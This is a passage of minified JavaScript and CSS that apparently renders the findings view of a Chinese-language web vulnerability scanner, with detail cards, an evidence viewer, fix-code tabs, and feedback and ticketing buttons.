      ${e.cwe_id?`<span class="src-detail-cwe" title="Common Weakness Enumeration">${w(e.cwe_id)}</span>`:""}
      ${e.owasp_category?`<span class="src-detail-owasp">${w(e.owasp_category)}</span>`:""}
      ${e.cvss_score?`<span class="src-detail-cvss" title="${w(e.cvss_vector||"")}">CVSS ${e.cvss_score}</span>`:""}
      ${e.severity_score?`<span class="src-detail-score">评分 ${e.severity_score}/10</span>`:""}
      <span class="src-detail-confidence">置信度 ${w((e.adjusted_confidence||e.confidence||"medium").toString())}</span>
      ${e.verification_status?`<span class="src-detail-verify-badge ${e.verification_status}">${e.verification_status==="confirmed"?"已验证":e.verification_status==="probable"?"可复现":"待人工复核"}</span>`:""}
      ${e.is_likely_fp?'<span class="src-detail-fp-badge src-detail-fp-badge-alert">疑似防护页</span>':""}
      ${e.user_feedback?e.user_feedback.is_false_positive?'<span class="src-detail-fp-badge" title="您误报">已标记误报</span>':'<span class="src-detail-verify-badge verified" title="您已确认">客户确认</span>':""}
    </div>
    ${c}
  </div>`,p+=`<div class="src-detail-tabs">
    <button class="src-detail-tab active" data-tab="overview">概览</button>
    <button class="src-detail-tab" data-tab="evidence">请求 / 响应</button>
    <button class="src-detail-tab" data-tab="fix">修复</button>
  </div>`,p+='<div class="src-detail-panel active" data-panel="overview">',e.fp_score!==void 0||e.verification_score!==void 0||e.fp_reasons&&e.fp_reasons.length>0){if(p+=`<div class="src-detail-section">
      <div class="src-section-title">可信度与证据等级</div>
      <div class="src-section-body">`,e.fp_score!==void 0){const b=(e.fp_score*100).toFixed(0),_=e.fp_score>=.5?"#c75450":e.fp_score>=.3?"#f0a732":"#73c990";p+=`<div class="src-kv"><span class="src-k">误报概率</span><span class="src-v" style="color:${_}">${b}%</span></div>`}if(e.verification_score!==void 0){const b=e.verification_score>=80?"#73c990":e.verification_score>=60?"#f0a732":"#c75450";p+=`<div class="src-kv"><span class="src-k">验证得分</span><span class="src-v" style="color:${b}">${e.verification_score}/100</span></div>`}e.verification_techniques&&e.verification_techniques.length>0&&(p+=`<div class="src-kv"><span class="src-k">验证技术</span><span class="src-v">${w(e.verification_techniques.join(", "))}</span></div>`),e.fp_reasons&&e.fp_reasons.length>0&&(p+=`<div class="src-fp-reasons"><ul>${e.fp_reasons.map(b=>`<li>${w(b)}</li>`).join("")}</ul></div>`),p+="</div></div>"}p+=`<div class="src-detail-section">
    <div class="src-section-title">漏洞描述</div>
    <div class="src-section-body">${w(e.description||"暂无描述")}</div>
  </div>`,p+=`<div class="src-detail-section">
    <div class="src-section-title">实际影响</div>
    <div class="src-section-body">${w(e.impact||"暂无影响说明")}</div>
  </div>`,p+=`<div class="src-detail-section">
    <div class="src-section-title">精准位置</div>
    <div class="src-section-body">
      <div class="src-kv"><span class="src-k">URL</span><code class="src-v">${w(o.url||e.url||"")}</code></div>
      ${o.method?`<div class="src-kv"><span class="src-k">方法</span><code class="src-v">${w(o.method)}</code></div>`:""}
      ${o.parameter||e.parameter?`<div class="src-kv"><span class="src-k">参数</span><code class="src-v">${w(o.parameter||e.parameter)}</code></div>`:""}
      ${o.parameter_type?`<div class="src-kv"><span class="src-k">参数类型</span><code class="src-v">${w(o.parameter_type)}</code></div>`:""}
      ${o.code_location?`<div class="src-kv"><span class="src-k">代码位置</span><code class="src-v">${w(o.code_location)}</code></div>`:""}
      ${o.snippet?`<div class="src-kv"><span class="src-k">上下文</span><span class="src-v">${w(o.snippet)}</span></div>`:""}
      ${!o.url&&e.location?`<div class="src-kv"><span class="src-k">位置</span><span class="src-v">${w(e.location)}</span></div>`:""}
    </div>
  </div>`,Array.isArray(e.reproduce_steps)&&e.reproduce_steps.length>0&&(p+=`<div class="src-detail-section">
      <div class="src-section-title">复测步骤</div>
      <ol class="src-repro-steps">`,e.reproduce_steps.forEach(b=>{p+=`<li>${w(b)}</li>`}),p+="</ol></div>"),p+="</div>",p+='<div class="src-detail-panel" data-panel="evidence">',p+=Yr(a,e),p+="</div>",p+='<div class="src-detail-panel" data-panel="fix">';const v=e.fix_suggestion||"暂无建议",m=v.split(/\n+/).map(b=>b.trim()).filter(Boolean),g=m[0]||"暂无建议",y=m.slice(1,4);return p+=`<div class="src-detail-section">
    <div class="src-section-title">修复结论</div>
    <div class="src-section-body">
      <div style="font-weight:700;margin-bottom:6px;color:var(--text-primary)">${w(g)}</div>
      <div style="font-size:12px;color:var(--text-secondary);line-height:1.7">${w(v)}</div>
    </div>
  </div>`,y.length>0&&(p+=`<div class="src-detail-section">
      <div class="src-section-title">实施步骤</div>
      <div class="src-section-body"><ol style="margin:0;padding-left:18px;line-height:1.8;color:var(--text-secondary)">`,y.forEach(b=>{p+=`<li>${w(b)}</li>`}),p+="</ol></div></div>"),p+=`<div class="src-detail-section">
    <div class="src-section-title">修复完成后的检查</div>
    <div class="src-section-body"><ul style="margin:0;padding-left:18px;line-height:1.8;color:var(--text-secondary)">
      <li>重新扫描同一地址，确认对应漏洞已消失。</li>
      <li>核对安全头、Cookie、重定向或页面响应是否符合预期。</li>
      <li>如果为高危项，建议先在测试环境验证再发布到生产。</li>
    </ul></div>
  </div>`,p+=Qr(e.fix_code||{}),p+="</div>",Array.isArray(e.references)&&e.references.length>0&&(p+=`<div class="src-detail-section">
      <div class="src-section-title">参考资料</div>
      <ul class="src-references">`,e.references.forEach(b=>{p+=`<li><a href="${xe(b)}" target="_blank" rel="noopener">${w(b)}</a></li>`}),p+="</ul></div>"),Pe&&he()&&(p+=`<div class="src-detail-actions">
      <button class="src-action-btn verify" data-action="verify" data-finding-id="${xe(e.id||"")}" title="重新请求目标并尝试验证是否仍可复现">复测验证</button>
      <button class="src-action-btn false-positive" data-action="fp" data-finding-id="${xe(e.id||"")}" title="如果你判断该项不是实际漏洞，可标记为误报或观察项">标记复核</button>
      <button class="src-action-btn confirm" data-action="confirm" data-finding-id="${xe(e.id||"")}" title="如果你确认该项真实存在，可标记为有效漏洞并进入修复流程">确认有效</button>
      <button class="src-action-btn ticket" data-action="ticket" data-finding-id="${xe(e.id||"")}" title="将该漏洞转为修复工单并跟踪处理">转工单</button>
    </div>`),p+=`<div class="src-detail-footer">
    <span>发现时间：${Jt(e.discovered_at||"")}</span>
  </div>`,p+="</div>",p}function Yr(e,i){const t=!!e.request,r=!!e.response,s=!!e.payload,a=!!e.screenshot,o=!!e.notes,n=!!e.matched_signature,d=Hi(e.request),u=Hi(e.response);let h='<div class="src-detail-section">';(s||n||o)&&(h+=`<div class="src-section-title">命中信息</div>
    <div class="src-section-body src-evidence-meta">`,s&&(h+=`<div class="src-evidence-row">
        <span class="src-evidence-label">Payload</span>
        <code class="src-payload">${w(e.payload)}</code>
        <button class="src-copy-btn" data-copy="${xe(e.payload)}">复制</button>
      </div>`),n&&(h+=`<div class="src-evidence-row">
        <span class="src-evidence-label">命中签名</span>
        <code class="src-signature">${w(e.matched_signature)}</code>
      </div>`),o&&(h+=`<div class="src-evidence-row">
        <span class="src-evidence-label">备注</span>
        <span>${w(e.notes)}</span>
      </div>`),h+="</div>"),h+=`<div class="src-section-title">证据</div>
    <div class="src-section-body src-evidence-meta">`;const c=i.finding_status||i.verification_status||(i.is_likely_fp?"suspected":"unverified"),p=i.status_label||{confirmed:"已确认",excluded:"已排除",suspected:"疑似",unverified:"未验证",probable:"疑似"}[c]||"未验证",v=c==="confirmed"?"A级（已确认）":c==="suspected"?"B级（疑似）":c==="excluded"?"排除":"C级（未验证）",m=e.location||e.position||e.selector||e.header||e.parameter||e.path||e.url||"";return h+=`<div class="src-evidence-row"><span class="src-evidence-label">可信度</span><span>${w(p)}</span></div>`,h+=`<div class="src-evidence-row"><span class="src-evidence-label">证据等级</span><span>${w(v)}</span></div>`,m&&(h+=`<div class="src-evidence-row"><span class="src-evidence-label">命中位置</span><span>${w(m)}</span></div>`),h+=`<div class="src-evidence-row"><span class="src-evidence-label">误报概率</span><span>${i.fp_score!==void 0?(i.fp_score*100).toFixed(0)+"%":"—"}</span></div>`,d&&(h+=`<div class="src-evidence-row"><span class="src-evidence-label">请求摘要</span><span>${w(d)}</span></div>`),u&&(h+=`<div class="src-evidence-row"><span class="src-evidence-label">响应摘要</span><span>${w(u)}</span></div>`),h+="</div>",(t||r)&&(h+=`<div class="src-section-title">HTTP 流量</div>
    <div class="src-traffic-viewer">`,t&&(h+=`<div class="src-traffic-panel">
        <div class="src-traffic-header">
          <span>请求</span>
          <button class="src-copy-btn" data-copy="${xe(e.request)}">复制</button>
        </div>
        <pre><code>${w(e.request)}</code></pre>
      </div>`),r&&(h+=`<div class="src-traffic-panel">
        <div class="src-traffic-header">
          <span>响应</span>
          <button class="src-copy-btn" data-copy="${xe(e.response)}">复制</button>
        </div>
        <pre><code>${w(e.response)}</code></pre>
      </div>`),h+="</div>"),a&&(h+=`<div class="src-screenshot-row">
      <span class="src-evidence-label">截图</span>
      <img src="${xe(e.screenshot)}" alt="证据截图" loading="lazy">
    </div>`),!t&&!r&&!s&&!a&&!o&&!n&&(h+=`<div class="src-section-title">证据</div>
    <div class="src-section-body"><div class="src-no-evidence">无详细技术证据</div></div>`),h+="</div>",h}function Hi(e){if(!e)return"";const i=String(e).split(/\r?\n/).map(n=>n.trim()).filter(Boolean);if(!i.length)return"";const t=i.find(n=>/^HTTP\/\d/i.test(n)),r=i.find(n=>/^(GET|POST|PUT|PATCH|DELETE|HEAD|OPTIONS)\s+/i.test(n)),s=r?r.split(/\s+/).slice(0,2).join(" "):"",a=i.filter(n=>/^[A-Za-z0-9\-]+:\s*/.test(n)).slice(0,3),o=[];return t&&o.push(t.replace(/^HTTP\/\d\.\d\s*/i,"HTTP ")),s&&o.push(s),a.length&&o.push(a.join(" | ")),o.join(" · ").slice(0,220)}function Qr(e){const t=[{key:"nginx",label:"Nginx"},{key:"apache",label:"Apache"},{key:"express",label:"Express"},{key:"flask",label:"Flask"},{key:"spring_boot",label:"Spring Boot"},{key:"cloudflare",label:"Cloudflare"},{key:"generic",label:"通用"}].filter(s=>e[s.key]);if(t.length===0)return"";let r=`<div class="src-detail-section">
    <div class="src-section-title">修复代码</div>
    <div class="src-fix-tabs">`;return t.forEach(s=>{const a=s.key===dt?"active":"";r+=`<button class="src-fix-tab ${a}" data-tab="${s.key}">${s.label}</button>`}),r+="</div>",t.forEach(s=>{const a=s.key===dt?"active":"hidden";r+=`<div class="src-fix-panel ${a}" data-panel="${s.key}">
      <pre><code>${w(e[s.key])}</code></pre>
      <button class="src-copy-btn" data-copy="${xe(e[s.key])}">复制代码</button>
    </div>`}),r+="</div>",r}function es(){const e=document.getElementById("result-content")||document.getElementById("result-container");!e||e.dataset.srcResultBound==="1"||(e.dataset.srcResultBound="1",e.addEventListener("click",function(i){const t=i.target.closest(".src-list-item");if(t){const u=parseInt(t.dataset.index,10);rs(u);return}const r=i.target.closest(".src-detail-tab");if(r){const u=r.dataset.tab,h=r.closest(".src-detail-card");if(!h)return;h.querySelectorAll(".src-detail-tab").forEach(c=>c.classList.remove("active")),r.classList.add("active"),h.querySelectorAll(".src-detail-panel").forEach(c=>{c.classList.toggle("active",c.dataset.panel===u)});return}const s=i.target.closest(".src-fix-tab");if(s){dt=s.dataset.tab,document.querySelectorAll(".src-fix-tab").forEach(u=>u.classList.remove("active")),s.classList.add("active"),document.querySelectorAll(".src-fix-panel").forEach(u=>{u.classList.toggle("active",u.dataset.panel===dt),u.classList.toggle("hidden",u.dataset.panel!==dt)});return}const a=i.target.closest(".src-copy-btn");if(a){const u=a.dataset.copy||"";kt(u).then(()=>T("已复制到剪贴板"));return}const o=i.target.closest(".src-export-btn");if(o){o.id==="src-copy-summary"?ts():is();return}const n=i.target.closest(".src-filter-btn");if(n&&n.dataset.action==="toggle-fp-filter"){Ye=!Ye;const u=Ye?je.filter(c=>!c.is_likely_fp):je;Wt=0;const h=document.getElementById("src-detail-panel");h&&(h.innerHTML=yi(u[0]));return}i.target.closest(".src-action-btn")&&ns(i)}))}async function ts(){if(!Pe)return;const i=Array.from(document.querySelectorAll(".finding-card")).slice(0,3).map((s,a)=>{const o=s.querySelector(".finding-title"),n=s.querySelector(".finding-severity");return`${a+1}. ${o?o.textContent.trim():"未命名项"}${n?`（${n.textContent.trim()}）`:""}`}).filter(Boolean),t=Math.max(0,(Nt.total||0)-(Nt.fp_count||0)),r=["报告摘要","扫描 ID: "+Pe,"URL: "+mi,"安全评分: "+cn,"总计: "+(Nt.total||0),"待处理: "+t,i.length?`重点项:
`+i.join(`
`):"重点项: 无","建议: 优先处理高危和严重项，修复后复测。"].join(`
`);await kt(r),T("报告摘要已复制")}async function is(){if(Pe)try{const i=await(await Mr({scan_id:Pe,format:"markdown"})).blob(),t=URL.createObjectURL(i),r=document.createElement("a");r.href=t,r.download=`src-report-${Pe}.md`,document.body.appendChild(r),r.click(),document.body.removeChild(r),URL.revokeObjectURL(t),T("SRC 报告已开始下载")}catch(e){T("导出失败："+(e&&e.message?e.message:"未知错误"))}}async function ns(e){const i=e.currentTarget,t=i.dataset.action,r=i.dataset.findingId,s=je.find(n=>n.id===r);if(!Pe||!s)return;if(t==="verify"){i.textContent="验证中...",i.disabled=!0;try{const n=await Pr({scan_id:Pe,finding_id:r,url:s.url||mi});if(n&&n.success){const d=n.reproducible===!0?"仍可复现":n.reproducible===!1?"已无法复现":"需人工复测";T(`验证完成：${d}`)}else T("验证失败："+(n&&n.error?n.error:"未知错误"))}catch{T("验证请求失败")}finally{i.textContent="验证复现",i.disabled=!1}return}const a=t==="fp"?"标记中...":t==="ticket"?"创建中...":"提交中...",o=t==="fp"?"标记误报":t==="ticket"?"工单":"确认有效";i.textContent=a,i.disabled=!0;try{if(t==="ticket"){const n=await Er({scan_id:Pe,finding_name:s.title||r,severity:s.severity||"low",fix_code:s.fix_code&&s.fix_code.generic?s.fix_code.generic:"",notes:s.fix_suggestion||s.description||""});n&&n.success?(T("工单已创建"),setTimeout(function(){Ur("tickets")},300)):T("工单失败："+(n&&n.error?n.error:"未知错误"))}else{const n=await Fr({scan_id:Pe,finding_name:s.title||r,finding_type:s.type||"",is_false_positive:t==="fp",is_confirmed:t==="confirm"});n&&n.success?T(t==="fp"?"误报，后续会用于优化检测":"已确认漏洞，已记录到反馈闭环"):T("反馈提交失败："+(n&&n.error?n.error:"未知错误"))}}catch{T(t==="ticket"?"工单创建失败":"反馈请求失败")}finally{i.textContent=o,i.disabled=!1}}function rs(e){Wt=e,document.querySelectorAll(".src-list-item").forEach((t,r)=>{t.classList.toggle("active",r===e)});const i=document.getElementById("src-detail-panel");i&&(i.innerHTML=yi(je[e]))}function ss(){if(document.getElementById("src-result-styles"))return;const e=document.createElement("style");e.id="src-result-styles",e.textContent=`
    .src-report-header { display:flex; gap:20px; align-items:center; background:var(--bg-card); border:1px solid var(--border); border-radius:var(--radius); padding:20px; margin-bottom:16px; }
    .src-score-wrap { flex:0 0 auto; }
    .src-score-ring { width:110px; height:110px; border-radius:50%; display:flex; flex-direction:column; align-items:center; justify-content:center; border:3px solid rgba(255,255,255,0.1); }
    .src-score-value { font-size:34px; font-weight:800; line-height:1; }
    .src-score-label { font-size:11px; opacity:0.85; margin-top:4px; }
    .src-report-meta { flex:1; min-width:0; }
    .src-report-title-row { display:flex; align-items:center; gap:12px; flex-wrap:wrap; margin-bottom:10px; }
    .src-report-url { font-family:var(--font); font-size:13px; color:var(--text-secondary); word-break:break-all; }
    .src-report-stats { display:flex; gap:10px; flex-wrap:wrap; margin-bottom:12px; }
    .src-stat { min-width:64px; text-align:center; padding:8px 10px; border-radius:var(--radius-sm); background:var(--bg-secondary); border:1px solid var(--border-light); }
    .src-stat .num { font-size:18px; font-weight:700; }
    .src-stat .label { font-size:11px; color:var(--text-secondary); }
    .src-stat.critical .num { color:#c75450; }
    .src-stat.high .num { color:#f0a732; }
    .src-stat.medium .num { color:#f0a732; }
    .src-stat.low .num { color:#73c990; }
    .src-stat.info .num { color:#808080; }
    .src-stat.total .num { color:var(--primary-light); }
    .src-report-submeta { display:flex; gap:12px; flex-wrap:wrap; font-size:12px; color:var(--text-secondary); }
    .meta-item { background:var(--token-bg); padding:3px 8px; border-radius:var(--radius-xs); }
    .src-report-actions { margin-top:12px; }
    .src-export-btn { background:var(--primary); color:#fff; border:none; padding:6px 14px; border-radius:var(--radius-xs); font-size:12px; cursor:pointer; }
    .src-export-btn:hover { background:var(--primary-light); }
    .src-report-capability { margin-top:12px; padding:12px 14px; border-radius:var(--radius-sm); background:rgba(115,201,144,0.08); border:1px solid rgba(115,201,144,0.18); }
    .src-report-capability-title { font-size:12px; font-weight:700; margin-bottom:8px; color:#73c990; }
    .src-report-capability-grid { display:grid; grid-template-columns:repeat(3, minmax(0, 1fr)); gap:10px; }
    .src-report-capability-item { background:rgba(255,255,255,0.03); border:1px solid var(--border-light); border-radius:var(--radius-xs); padding:8px 10px; display:flex; flex-direction:column; gap:4px; }
    .src-report-capability-item span { font-size:11px; color:var(--text-secondary); }
    .src-report-capability-item strong { font-size:13px; color:var(--text-primary); }
    .src-report-capability-text { margin-top:8px; font-size:12px; color:var(--text-secondary); line-height:1.7; }
    @media (max-width: 900px) { .src-report-capability-grid { grid-template-columns:1fr; } }
    .src-report-priority-list { display:grid; gap:8px; margin-top:10px; }
    .src-report-priority-item { display:flex; gap:10px; align-items:flex-start; padding:10px 12px; border:1px solid var(--border-light); border-radius:var(--radius-xs); background:rgba(255,255,255,0.03); }
    .src-report-priority-index { width:18px; height:18px; border-radius:999px; display:inline-flex; align-items:center; justify-content:center; background:rgba(115,201,144,0.18); color:#73c990; font-size:11px; font-weight:700; flex:0 0 auto; margin-top:1px; }
    .src-surface-overview { margin-bottom:16px; padding:16px 18px; background:linear-gradient(180deg, rgba(75,110,175,0.12), rgba(75,110,175,0.04)); border:1px solid rgba(75,110,175,0.24); border-radius:var(--radius); }
    .src-surface-overview-head { display:flex; align-items:flex-start; justify-content:space-between; gap:12px; margin-bottom:12px; }
    .src-surface-overview-title { font-size:14px; font-weight:700; color:var(--text-primary); }
    .src-surface-overview-subtitle { margin-top:3px; font-size:12px; color:var(--text-secondary); line-height:1.5; }
    .src-surface-overview-pill { font-size:11px; font-weight:700; color:var(--primary-light); background:rgba(75,110,175,0.12); border:1px solid rgba(75,110,175,0.24); border-radius:999px; padding:4px 10px; white-space:nowrap; }
    .src-surface-grid { display:grid; grid-template-columns:repeat(4, minmax(0, 1fr)); gap:10px; }
    @media (max-width: 1100px) { .src-surface-grid { grid-template-columns:repeat(2, minmax(0, 1fr)); } }
    @media (max-width: 640px) { .src-surface-grid { grid-template-columns:1fr; } .src-surface-overview-head { flex-direction:column; } }
    .surface-card { padding:12px; border-radius:var(--radius-sm); border:1px solid var(--border-light); background:rgba(255,255,255,0.03); display:flex; flex-direction:column; gap:8px; }
    .surface-card.critical { border-color:rgba(199,84,80,0.34); background:rgba(199,84,80,0.08); }
    .surface-card.medium { border-color:rgba(240,167,50,0.34); background:rgba(240,167,50,0.08); }
    .surface-card.low { border-color:rgba(115,201,144,0.28); background:rgba(115,201,144,0.06); }
    .surface-card-head { display:flex; align-items:center; justify-content:space-between; gap:10px; }
    .surface-card-title { font-size:13px; font-weight:700; color:var(--text-primary); }
    .surface-card-badge { font-size:10px; font-weight:700; text-transform:uppercase; letter-spacing:0.2px; color:var(--text-secondary); background:var(--token-bg); padding:2px 6px; border-radius:999px; }
    .surface-card-count { font-size:26px; font-weight:800; line-height:1; color:var(--text-primary); }
    .surface-card-detail { font-size:11px; color:var(--text-secondary); line-height:1.5; }

    .src-quality-panel { background:var(--bg-card); border:1px solid var(--border); border-radius:var(--radius); margin-bottom:16px; overflow:hidden; }
    .src-quality-header { display:flex; align-items:center; gap:20px; padding:14px 18px; cursor:pointer; }
    .src-quality-score-wrap { display:flex; flex-direction:column; align-items:center; gap:4px; }
    .src-quality-ring { width:48px; height:48px; border-radius:50%; border:3px solid; display:flex; align-items:center; justify-content:center; }
    .src-quality-title { font-size:11px; color:var(--text-secondary); }
    .src-quality-bars { flex:1; display:flex; flex-direction:column; gap:6px; }
    .src-quality-bar-row { display:flex; align-items:center; gap:10px; }
    .src-quality-bar-label { width:50px; font-size:12px; color:var(--text-secondary); text-align:right; }
    .src-quality-bar { flex:1; height:8px; background:var(--bg-secondary); border-radius:4px; overflow:hidden; }
    .src-quality-bar-fill { height:100%; border-radius:4px; transition:width 0.6s ease; }
    .src-quality-bar-val { width:28px; font-size:12px; font-weight:600; text-align:right; }
    .src-quality-expand { background:var(--bg-secondary); border:1px solid var(--border); color:var(--text-secondary); padding:4px 10px; border-radius:var(--radius-xs); font-size:11px; cursor:pointer; white-space:nowrap; }
    .src-quality-expand:hover { border-color:var(--primary); color:var(--primary-light); }
    .src-quality-detail { padding:0 18px 14px; border-top:1px solid var(--border-light); }
    .src-quality-grid { display:grid; grid-template-columns:1fr 1fr; gap:14px; margin-top:12px; }
    @media (max-width:700px) { .src-quality-grid { grid-template-columns:1fr; } }
    .src-quality-section { }
    .src-quality-section-title { font-size:12px; font-weight:700; color:var(--text-secondary); margin-bottom:8px; }
    .src-quality-section-body { display:flex; flex-direction:column; gap:4px; }
    .src-quality-kv { display:flex; justify-content:space-between; align-items:center; font-size:12px; }
    .src-quality-kv span { color:var(--text-secondary); }
    .src-quality-kv code { background:var(--token-bg); padding:2px 6px; border-radius:var(--radius-xs); font-size:11px; }
    .src-quality-dedup { display:flex; align-items:center; gap:8px; margin-top:12px; padding:10px; background:var(--bg-secondary); border-radius:var(--radius-sm); flex-wrap:wrap; }
    .src-quality-label { font-size:12px; font-weight:700; color:var(--text-secondary); }
    .src-quality-stat { font-size:13px; font-weight:600; }
    .src-quality-stat.highlight { color:var(--primary-light); }
    .src-quality-arrow { color:var(--text-secondary); }
    .src-quality-tag { background:var(--token-bg); padding:2px 8px; border-radius:10px; font-size:11px; color:var(--text-secondary); }
    .src-quality-recommendations { margin-top:12px; }
    .src-quality-rec-list { margin:0; padding-left:18px; font-size:12px; color:var(--text-secondary); }
    .src-quality-rec-list li { margin-bottom:4px; line-height:1.5; }

    .src-result-layout { display:grid; grid-template-columns:380px 1fr; gap:16px; }
    @media (max-width:900px) { .src-result-layout { grid-template-columns:1fr; } }

    .src-result-sidebar { background:var(--bg-card); border:1px solid var(--border); border-radius:var(--radius); overflow:hidden; max-height:calc(100vh - 220px); display:flex; flex-direction:column; }
    .src-list-header { padding:12px 14px; border-bottom:1px solid var(--border-light); font-weight:700; font-size:13px; display:flex; align-items:center; justify-content:space-between; }
    .src-list-count { background:var(--primary); color:#fff; font-size:11px; padding:2px 8px; border-radius:10px; }
    .src-list-items { overflow-y:auto; flex:1; padding:6px; }
    .src-list-item { padding:10px 12px; border-radius:var(--radius-sm); cursor:pointer; border-left:3px solid transparent; margin-bottom:4px; transition:background .12s; }
    .src-list-item:hover { background:var(--bg-secondary); }
    .src-list-item.active { background:var(--verify-selected); border-left-color:var(--primary); }
    .src-list-item.critical { border-left-color:#c75450; }
    .src-list-item.high { border-left-color:#c75450; }
    .src-list-item.medium { border-left-color:#f0a732; }
    .src-list-item.low { border-left-color:#73c990; }
    .src-list-item.info { border-left-color:#808080; }
    .src-list-row { display:flex; align-items:center; gap:8px; }
    .src-list-row.top { align-items:flex-start; }
    .src-list-row.meta { margin-top:6px; flex-wrap:wrap; font-size:11px; }
    .src-sev-badge { font-size:10px; font-weight:700; padding:2px 7px; border-radius:var(--radius-xs); color:#fff; white-space:nowrap; flex:0 0 auto; }
    .src-sev-badge.critical { background:#c75450; }
    .src-sev-badge.high { background:#c75450; }
    .src-sev-badge.medium { background:#f0a732; color:#000; }
    .src-sev-badge.low { background:#73c990; color:#000; }
    .src-sev-badge.info { background:#808080; }
    .src-list-title { font-size:13px; font-weight:600; color:var(--text-primary); flex:1; word-break:break-word; line-height:1.4; }
    .src-list-type { font-size:10px; background:var(--token-bg); padding:2px 6px; border-radius:var(--radius-xs); color:var(--text-secondary); }
    .src-list-surface { font-size:10px; background:rgba(115,201,144,0.12); color:#73c990; padding:2px 6px; border-radius:var(--radius-xs); }
    .src-list-param { font-size:10px; background:rgba(75,110,175,0.15); color:var(--primary-light); padding:2px 6px; border-radius:var(--radius-xs); }
    .src-list-host { color:var(--text-secondary); font-family:var(--font); white-space:nowrap; overflow:hidden; text-overflow:ellipsis; max-width:180px; }
    .src-list-confidence { font-size:11px; color:var(--text-secondary); margin-left:auto; text-transform:uppercase; }
    .src-list-fp-tag { background:#c7545022; color:#c75450; font-size:10px; padding:1px 5px; border-radius:3px; font-weight:700; }
    .src-list-fp-tag-alert { background:rgba(240,167,50,0.18); color:#f0a732; }
    .src-list-fp-tag-alert.fp { background:rgba(199,84,80,0.18); color:#c75450; }
    .src-list-fp-tag-alert.info { background:rgba(128,128,128,0.18); color:#808080; }
    .src-list-merged { background:var(--primary); color:#fff; font-size:10px; padding:1px 5px; border-radius:3px; font-weight:600; }
    .src-list-corr { background:var(--token-bg); color:var(--text-secondary); font-size:10px; padding:1px 5px; border-radius:3px; font-family:var(--font); }
    .src-list-v { font-size:10px; padding:1px 5px; border-radius:3px; font-weight:700; margin-left:4px; }
    .src-list-v.confirmed { background:rgba(115,201,144,0.2); color:#73c990; }
    .src-list-v.probable { background:rgba(240,167,50,0.2); color:#f0a732; }
    .src-list-v.suspected { background:rgba(199,84,80,0.2); color:#c75450; }
    .src-list-fb { font-size:10px; padding:1px 5px; border-radius:3px; font-weight:700; margin-left:4px; }
    .src-list-fb.confirmed { background:rgba(115,201,144,0.2); color:#73c990; }
    .src-list-fb.fp { background:rgba(128,128,128,0.2); color:#808080; }
    .src-list-confidence.high { color:#73c990; }
    .src-list-confidence.medium { color:#f0a732; }
    .src-list-confidence.low { color:#c75450; }
    .verification-badge { display:flex; gap:4px; align-items:center; }
    .verification-badge span { font-size:10px; padding:1px 5px; border-radius:3px; font-weight:600; }
    .v-confirmed { background:rgba(115,201,144,0.2); color:#73c990; }
    .v-probable { background:rgba(240,167,50,0.2); color:#f0a732; }
    .v-suspected { background:rgba(199,84,80,0.2); color:#c75450; }

    .src-result-detail { max-height:calc(100vh - 220px); overflow-y:auto; }
    .src-detail-card { background:var(--bg-card); border:1px solid var(--border); border-radius:var(--radius); padding:0; display:flex; flex-direction:column; }
    .src-detail-header { border-bottom:1px solid var(--border-light); padding:16px 18px 14px; }
    .src-detail-title-row { display:flex; align-items:flex-start; gap:10px; margin-bottom:10px; }
    .src-detail-severity { font-size:11px; font-weight:700; padding:3px 10px; border-radius:var(--radius-xs); color:#fff; white-space:nowrap; }
    .src-detail-severity.critical { background:#c75450; }
    .src-detail-severity.high { background:#c75450; }
    .src-detail-severity.medium { background:#f0a732; color:#000; }
    .src-detail-severity.low { background:#73c990; color:#000; }
    .src-detail-severity.info { background:#808080; }
    .src-detail-title { font-size:17px; font-weight:700; margin:0; color:var(--text-primary); flex:1; line-height:1.4; }
    .src-detail-status { font-size:11px; padding:2px 8px; border-radius:var(--radius-xs); margin-left:auto; border:1px solid var(--border-light); }
    .src-detail-status.open { background:rgba(240,167,50,0.12); color:#f0a732; border-color:rgba(240,167,50,0.3); }
    .src-detail-status.confirmed { background:rgba(199,84,80,0.15); color:#c75450; border-color:rgba(199,84,80,0.3); }
    .src-detail-status.false_positive { background:rgba(128,128,128,0.15); color:#808080; border-color:rgba(128,128,128,0.3); }
    .src-detail-status.fixed { background:rgba(115,201,144,0.15); color:#73c990; border-color:rgba(115,201,144,0.3); }
    .src-detail-subtitle { display:flex; gap:10px; flex-wrap:wrap; align-items:center; font-size:12px; color:var(--text-secondary); }
    .src-detail-id { background:var(--token-bg); padding:2px 6px; border-radius:var(--radius-xs); }
    .src-detail-type { color:var(--primary-light); font-weight:600; }
    .src-detail-cwe { background:rgba(199,84,80,0.12); color:#e08e8a; padding:2px 8px; border-radius:var(--radius-xs); }
    .src-detail-owasp { background:rgba(75,110,175,0.12); color:var(--primary-light); padding:2px 8px; border-radius:var(--radius-xs); }
    .src-detail-cvss { background:rgba(240,167,50,0.12); color:#f0a732; padding:2px 8px; border-radius:var(--radius-xs); }
    .src-detail-score { background:rgba(115,201,144,0.12); color:#73c990; padding:2px 8px; border-radius:var(--radius-xs); }
    .src-detail-confidence { background:var(--token-bg); color:var(--text-secondary); padding:2px 8px; border-radius:var(--radius-xs); }
    .src-detail-fp-badge { background:rgba(199,84,80,0.15); color:#c75450; padding:2px 8px; border-radius:var(--radius-xs); font-weight:600; }
    .src-detail-verify-badge { padding:2px 8px; border-radius:var(--radius-xs); font-weight:600; }
    .src-detail-verify-badge.verified { background:rgba(115,201,144,0.15); color:#73c990; }
    .src-detail-verify-badge.unverified { background:rgba(240,167,50,0.15); color:#f0a732; }
    .src-detail-verify-badge.confirmed { background:rgba(115,201,144,0.15); color:#73c990; }
    .src-detail-verify-badge.probable { background:rgba(240,167,50,0.15); color:#f0a732; }
    .src-detail-verify-badge.suspected { background:rgba(199,84,80,0.15); color:#c75450; }
    .src-fp-banner { margin:12px 0 4px; padding:12px 14px; border:1px solid rgba(240,167,50,0.35); border-radius:var(--radius-sm); background:linear-gradient(135deg, rgba(240,167,50,0.12), rgba(199,84,80,0.08)); }
    .src-fp-banner-title { font-size:13px; font-weight:700; color:#f0a732; margin-bottom:4px; }
    .src-fp-banner-desc { font-size:12px; color:var(--text-secondary); line-height:1.6; }

    .src-fp-reasons { margin-top:8px; }
    .src-fp-reasons ul { margin:0; padding-left:18px; }
    .src-fp-reasons li { font-size:12px; color:var(--text-secondary); margin-bottom:3px; }

    .src-detail-tabs { display:flex; border-bottom:1px solid var(--border-light); background:var(--bg-secondary); }
    .src-detail-tab { background:transparent; border:none; border-bottom:2px solid transparent; color:var(--text-secondary); padding:10px 16px; font-size:12px; font-weight:600; cursor:pointer; }
    .src-detail-tab:hover { color:var(--text-primary); }
